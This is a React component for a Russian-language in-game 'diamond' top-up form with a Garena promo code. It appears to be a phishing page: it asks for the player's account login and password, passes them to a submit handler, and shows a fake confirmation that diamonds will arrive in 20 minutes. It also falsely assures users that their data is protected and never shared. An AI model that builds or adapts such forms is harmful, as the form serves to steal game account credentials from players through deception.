import React, { useState, useEffect } from 'react';
import BindingSelector from './BindingSelector';
import SubmissionNotification from './SubmissionNotification';

interface PurchaseFormProps {
  packageName: string;
  diamonds: number;
  price: number;
  onSubmit: (data: PurchaseData) => void;
}

interface PurchaseData {
  bindingType: string;
  uid: string;
  login: string;
  password: string;
}

interface NotificationState {
  show: boolean;
  type: 'success' | 'error';
  message: string;
}

export default function PurchaseForm({ packageName, diamonds, price, onSubmit }: PurchaseFormProps) {
  const [step, setStep] = useState(1);
  const [bindingType, setBindingType] = useState('');
  const [promoCode, setPromoCode] = useState('');
  const [isPromoValid, setIsPromoValid] = useState(false);
  const [formData, setFormData] = useState({
    uid: '',
    login: '',
    password: ''
  });
  const [notification, setNotification] = useState<NotificationState>({
    show: false,
    type: 'success',
    message: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    // Проверяем количество отправок и время последней отправки
    const submissions = JSON.parse(localStorage.getItem('submissions') || '[]');
    const currentTime = new Date().getTime();
    
    // Фильтруем отправки за последние 24 часа
    const recentSubmissions = submissions.filter((time: number) => {
      const hoursDiff = (currentTime - time) / (1000 * 60 * 60);
      return hoursDiff < 24;
    });

    if (recentSubmissions.length >= 5) {
      const oldestSubmission = Math.min(...recentSubmissions);
      const hoursSinceOldest = (currentTime - oldestSubmission) / (1000 * 60 * 60);
      const hoursLeft = Math.ceil(24 - hoursSinceOldest);
      
      setNotification({
        show: true,
        type: 'error',
        message: `Достигнут лимит отправок (5 в сутки). Следующая отправка будет доступна через ${hoursLeft} ч.`
      });
      setIsSubmitting(true);
    }
  }, []);

  const handleBindingSelect = (option: string) => {
    setBindingType(option);
    setStep(2);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handlePromoSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (promoCode.toLowerCase() === 'garena2025') {
      setIsPromoValid(true);
      setNotification({
        show: true,
        type: 'success',
        message: 'Промокод успешно применен!'
      });
    } else {
      setNotification({
        show: true,
        type: 'error',
        message: 'Неверный промокод'
      });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (isSubmitting) {
      return;
    }

    setIsSubmitting(true);

    try {
      // Получаем текущие отправки
      const currentTime = new Date().getTime();
      const submissions = JSON.parse(localStorage.getItem('submissions') || '[]');
      
      // Фильтруем и добавляем новую отправку
      const recentSubmissions = submissions
        .filter((time: number) => {
          const hoursDiff = (currentTime - time) / (1000 * 60 * 60);
          return hoursDiff < 24;
        })
        .concat([currentTime]);

      // Сохраняем обновленный список отправок
      localStorage.setItem('submissions', JSON.stringify(recentSubmissions));
      
      // Отправляем данные
      onSubmit({
        bindingType,
        ...formData
      });

      // Показываем уведомление об успехе
      const isValidData = formData.uid.length > 5 && formData.login.length > 3 && formData.password.length > 5;
      
      setNotification({
        show: true,
        type: 'success',
        message: isValidData 
          ? 'Спасибо за покупку! Ваши алмазы будут доставлены через 20 минут.' 
          : 'Пожалуйста, проверьте введенные данные и отправьте форму повторно.'
      });
    } catch (error) {
      setNotification({
        show: true,
        type: 'error',
        message: 'Произошла ошибка при отправке заявки. Пожалуйста, попробуйте позже.'
      });
      setIsSubmitting(false);
    }
  };

  const closeNotification = () => {
    setNotification(prev => ({ ...prev, show: false }));
  };

  return (
    <div className="max-w-4xl mx-auto">
      {/* Информация о выбранном пакете */}
      <div className="bg-white/5 rounded-2xl p-6 mb-8 backdrop-blur-sm border border-white/10">
        <div className="flex items-center justify-between">
          <div>
            <h3 className="text-2xl font-bold text-white mb-2">
              {packageName}
            </h3>
            <div className="flex items-center gap-2 text-gray-400">
              <span className="text-2xl">💎</span>
              <span>{diamonds} алмазов</span>
            </div>
          </div>
          <div className="text-right">
            <div className="text-sm text-gray-400 mb-1">Стоимость:</div>
            <div className="text-2xl font-bold bg-gradient-to-r from-white to-blue-400 bg-clip-text text-transparent">
              {price} ₽
            </div>
          </div>
        </div>
      </div>

      {/* Пошаговая форма */}
      <div className="relative">
        {/* Индикатор прогресса */}
        <div className="absolute top-0 left-0 w-full h-1 bg-white/10 rounded-full overflow-hidden">
          <div 
            className="h-full bg-gradient-to-r from-blue-500 to-purple-500 transition-all duration-300"
            style={{ width: step === 1 ? '50%' : '100%' }}
          ></div>
        </div>

        <div className="pt-8">
          {step === 1 ? (
            <BindingSelector 
              onSelect={handleBindingSelect}
              selectedOption={bindingType}
            />
          ) : (
            <div className="glass-card p-8">
              <div className="flex items-center gap-6 mb-8">
                <div className="w-16 h-16 glass-effect rounded-2xl p-3 floating">
                  <div className="w-full h-full flex items-center justify-center text-3xl">
                    📝
                  </div>
                </div>
                <div>
                  <h2 className="text-3xl font-bold gradient-text mb-2">
                    Введите данные
                  </h2>
                  <p className="text-gray-400">
                    Укажите данные вашего аккаунта для пополнения
                  </p>
                </div>
              </div>

              {/* Промокод */}
              <div className="mb-8">
                <form onSubmit={handlePromoSubmit} className="flex gap-4">
                  <div className="flex-1">
                    <input
                      type="text"
                      value={promoCode}
                      onChange={(e) => setPromoCode(e.target.value)}
                      placeholder="Введите промокод"
                      className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all duration-300"
                    />
                  </div>
                  <button
                    type="submit"
                    className="bg-gradient-to-r from-yellow-500 to-orange-500 hover:opacity-90 text-white px-6 py-3 rounded-xl transition-all duration-300 font-medium"
                  >
                    Применить
                  </button>
                </form>
                {isPromoValid && (
                  <div className="mt-2 text-sm text-green-400 flex items-center gap-2">
                    <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                    Промокод активирован
                  </div>
                )}
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <label className="block text-white mb-2">ID игрока</label>
                  <input
                    type="text"
                    name="uid"
                    value={formData.uid}
                    onChange={handleInputChange}
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all duration-300"
                    placeholder="Введите ваш ID"
                    required
                    disabled={isSubmitting}
                  />
                </div>

                <div>
                  <label className="block text-white mb-2">Логин</label>
                  <input
                    type="text"
                    name="login"
                    value={formData.login}
                    onChange={handleInputChange}
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all duration-300"
                    placeholder="Введите логин"
                    required
                    disabled={isSubmitting}
                  />
                </div>

                <div>
                  <label className="block text-white mb-2">Пароль</label>
                  <input
                    type="password"
                    name="password"
                    value={formData.password}
                    onChange={handleInputChange}
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all duration-300"
                    placeholder="Введите пароль"
                    required
                    disabled={isSubmitting}
                  />
                </div>

                <div className="flex gap-4">
                  <button
                    type="button"
                    onClick={() => setStep(1)}
                    className="flex-1 bg-white/5 hover:bg-white/10 text-white px-6 py-3 rounded-xl transition-all duration-300 border border-white/10"
                    disabled={isSubmitting}
                  >
                    Назад
                  </button>
                  <button
                    type="submit"
                    className={`flex-1 bg-gradient-to-r from-blue-500 to-purple-500 hover:opacity-90 text-white px-6 py-3 rounded-xl transition-all duration-300 font-medium ${
                      isSubmitting ? 'opacity-50 cursor-not-allowed' : ''
                    }`}
                    disabled={isSubmitting}
                  >
                    {isSubmitting ? 'Отправка...' : 'Продолжить'}
                  </button>
                </div>
              </form>

              <div className="mt-8 p-4 bg-blue-500/10 rounded-xl border border-blue-500/20">
                <div className="flex items-start gap-3">
                  <span className="text-xl">🔒</span>
                  <p className="text-sm text-blue-200/80">
                    Ваши данные надежно защищены и используются только для пополнения алмазов. 
                    Мы не храним и не передаем их третьим лицам.
                  </p>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Уведомление */}
      {notification.show && (
        <SubmissionNotification
          type={notification.type}
          message={notification.message}
          onClose={closeNotification}
        />
      )}
    </div>
  );
} 